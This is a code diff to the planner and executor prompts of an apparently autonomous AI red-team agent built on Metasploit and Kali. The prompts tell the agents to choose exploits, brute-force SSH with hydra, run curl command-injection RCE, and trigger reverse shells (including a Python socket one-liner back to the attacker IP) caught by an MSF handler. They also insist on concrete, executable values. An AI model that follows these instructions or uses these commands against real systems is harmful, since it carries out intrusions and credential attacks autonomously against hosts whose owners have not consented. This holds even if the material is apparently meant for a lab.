@@ -273,10 +273,18 @@ prefer those over RAG-sourced or general-knowledge exploits unless they've alrea
 6. SCOPE: Exploitation only — no recon/scanning
 6b. **MISSED-PORT / PROVEN-EXPLOIT OVERRIDE**: When the researcher's summary mentions a well-known service (e.g., IRC/UnrealIRCd on port 6667) that is NOT in target_info.ports but has HIGH-CONFIDENCE past-success evidence (a successful_attacks log for this exploit/IP), you MAY select it with approach="msf" and note the port explicitly in PART 1. Do NOT discard proven exploits just because the port was missed in recon's top-100 scan — a service can be open even if Nmap's default scan did not list it.
 6c. **PROVEN-VECTOR PRIORITY (decisive on retry/fallback)**: The research results mark vectors with prior real successes as `[PROVEN]` (a successful_attacks hit for this target/OS/service). A `[PROVEN]` vector is worth more than any unproven RAG or general-knowledge module. On a RETRY, or on a fallback from a prescribed vector that just failed, if a `[PROVEN]` vector exists and is NOT banned, SELECT IT NOW — do not keep tuning parameters on, or guessing alternatives for, the unproven vector that failed. Burning the wall-clock time-box grinding an unproven module while a proven one is on the table is the failure mode this rule exists to prevent (even if the proven service's port was missed in recon — see 6b).
-7. **CHOOSE APPROACH** — select "msf" (Metasploit module) or "manual" (Linux terminal commands):
-   - Use "msf" when a compatible MSF module exists that supports the user's needs
-   - Use "manual" when the user wants a payload type no MSF module supports, or when MSF has already failed and a manual approach is more promising
-   - Manual approach uses tool_linux_terminal for netcat listeners, crafted reverse shells, curl-based RCE, etc.
+7. **CHOOSE APPROACH** — "msf" (Metasploit module) or "manual" (raw bash on Kali). These are
+   CO-EQUAL first-class options — "manual" is NOT a last resort:
+   - Use "msf" when a compatible MSF module cleanly delivers what's needed.
+   - Use "manual" when raw tooling is the better fit: a documented curl/python/wget
+     command-injection or RCE, a credential attack (hydra/medusa/sshpass), smbclient,
+     clone-and-run a PoC — OR when no MSF module fits or MSF already failed.
+   - Manual uses tool_linux_terminal. **CRITICAL for a manual REVERSE shell: catch it with an
+     MSF handler (`use exploit/multi/handler; set PAYLOAD <matching>; set LHOST; set LPORT; set
+     ReverseListenerBindAddress 0.0.0.0; run -j`) BEFORE triggering the exploit — do NOT use a
+     bare `nc` listener. Only an MSF-caught shell registers as "session … opened" success and
+     is usable by later stages.** A blind RCE that only returns command output (no shell) is
+     not a session — prefer a reverse shell caught by the handler.
 
 Output your plan in TWO parts:
 
@@ -359,19 +367,31 @@ Output the command sequence as a numbered list, one command per line:
 8. show options
 9. run
 
-**If approach is "manual" (Linux terminal):**
+**If approach is "manual" (raw bash on Kali, optionally with an MSF handler to catch a shell):**
 
-Generate the EXACT sequence of Linux terminal commands for a manual attack (no Metasploit).
+Generate the EXACT command sequence for a manual attack.
 
-Examples of manual attack patterns:
-- Netcat listener: `nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &`
-- Python reverse shell trigger via vulnerable service: `echo 'AB; python -c "import socket,subprocess,os;s=socket.socket(...);s.connect((\"{KALI_IP}\",4444));..." | nc <target_ip> <port>`
-- Curl-based RCE: `curl http://<target_ip>:<port>/vulnerable_endpoint -d 'payload=...'`
-- Crafted payloads via bash, perl, python, ruby
+**A manual REVERSE shell MUST be caught by an MSF handler — a bare `nc` listener is NOT tracked
+as a session and will be scored a FAILURE.** So stand the handler up FIRST (console commands),
+then trigger the callback (terminal command):
+1. use exploit/multi/handler
+2. set PAYLOAD cmd/unix/reverse_python   ← match the shell you trigger in the last step
+3. set LHOST {KALI_IP}
+4. set LPORT 4444
+5. set ReverseListenerBindAddress 0.0.0.0
+6. run -j                                 ← backgrounds the handler; the callback becomes "session … opened"
+7. <trigger: a crafted python/bash/perl reverse shell delivered through the vulnerable service,
+   or a curl/wget command-injection that makes the target connect back to {KALI_IP}:4444>
+
+Non-shell patterns (no handler needed — these succeed on their own terms):
+- Credential attack: `hydra -l vagrant -p vagrant ssh://<target_ip>`  (or a short -P pass list)
+- Output-returning RCE: `curl 'http://<target_ip>:<port>/vulnerable_endpoint' -d 'payload=id'`
 
 **CRITICAL — NO PLACEHOLDERS (manual mode too)**: Every value MUST be concrete — never use angle-bracket placeholders (<username>, <path>, <target_ip>, <port>), pseudo-code, or inline comments inside command arguments. Substitute the real target IP from target_info, real wordlist paths (e.g. /usr/share/wordlists/john.lst), and real usernames (e.g. vagrant). Commands are executed EXACTLY as written.
 
-Output the command sequence as a numbered list, one command per line. Each command should use tool_linux_terminal.
+Output the command sequence as a numbered list, one command per line. Prefix each MSF-console
+command (the handler) with `[msf]` and each Linux-terminal command (the trigger) with `[sh]` so
+the executor routes each to the right tool.
 """
 
 EXECUTOR_PROMPT = f"""You are a Red Team Execution Specialist. Your attacker IP is {KALI_IP}.
@@ -407,8 +427,15 @@ You have access to the Metasploit console and a Linux terminal. Execute the atta
 
 **Manual Attack Rules:**
 13. Do NOT install packages (no apt-get, no pip, no gem). Use only tools already available on Kali.
-14. If the attack plan specifies a MANUAL approach (not MSF), use `tool_linux_terminal` for all commands instead of `tool_metasploit_rpc`.
-15. For listener setup in manual mode, use backgrounded commands (e.g., `nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &`) to avoid blocking the terminal.
+14. MANUAL approach ROUTING: a manual plan may mix an MSF handler (to catch a reverse shell)
+    with Linux commands (to trigger it). Route each command by its prefix — `[msf]` → run via
+    tool_metasploit_rpc (the console), `[sh]` → run via tool_linux_terminal. If a command is
+    unprefixed, infer: MSF console verbs (use/set/run/exploit/sessions/jobs) → tool_metasploit_rpc;
+    everything else (curl, python, hydra, echo, bash) → tool_linux_terminal.
+15. To CATCH a manual reverse shell, use an MSF `exploit/multi/handler` backgrounded with `run -j`
+    (NOT a bare `nc` listener) — only an MSF-caught callback registers as "session … opened" and is
+    usable by later stages. After firing the trigger, read the console again (or `sessions -l`) via
+    tool_metasploit_rpc to surface the async "session … opened" line before judging success/failure.
 16. **SAMBA is_known_pipename**: For exploit/linux/samba/is_known_pipename the ONLY compatible payload is cmd/unix/interact. This is a BIND module — it connects FROM the target. Start a netcat listener on Kali FIRST via tool_linux_terminal: `nohup nc -lvnp 4444 > /tmp/samba_shell.txt 2>&1 &`. Then set RHOST to the target IP and RPORT to 445 (NOT 4444). Do NOT set LHOST or LPORT — they are not valid for this module. The session appears as "Command shell session opened".
 
 **Success indicators:** "Command shell session X opened", "Meterpreter session X opened"
